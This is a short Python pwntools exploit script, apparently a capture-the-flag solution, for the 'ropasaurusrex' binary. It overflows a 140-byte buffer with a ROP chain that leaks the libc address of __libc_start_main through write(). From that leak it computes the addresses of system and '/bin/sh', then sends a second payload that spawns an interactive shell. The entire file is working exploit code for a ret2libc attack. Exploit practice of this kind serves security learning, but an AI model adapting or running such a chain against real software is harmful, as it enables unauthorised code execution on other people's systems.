from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF("./ropasaurusrex")
libc = ELF("./libc.so.6")

#main = elf.symbols['main']
main = 0x80483F4

libc_start_main_got = elf.got['__libc_start_main']
write_plt = elf.plt['write']

p = process("./ropasaurusrex")

payload = flat(['A' * 140, write_plt, main, 1, libc_start_main_got, 8])
with open("./shell", "wb") as f:
    f.write(payload)
f.close()
p.sendline(payload)

#gdb.attach(proc.pidof(p)[0])
libc_start_main_addr = u32(p.recv()[:4])

print 'libc_start_main_addr: ' + hex(libc_start_main_addr)

system_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - libc.symbols['system'])
binsh_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - next(libc.search('/bin/sh')))

print 'system_addr: ' + hex(system_addr)
print 'binsh_addr: ' + hex(binsh_addr)

payload = flat(['A' * 140, system_addr, main, binsh_addr])

with open("./shell1", "wb") as f:
    f.write(payload)
f.close()
p.sendline(payload)
p.interactive()

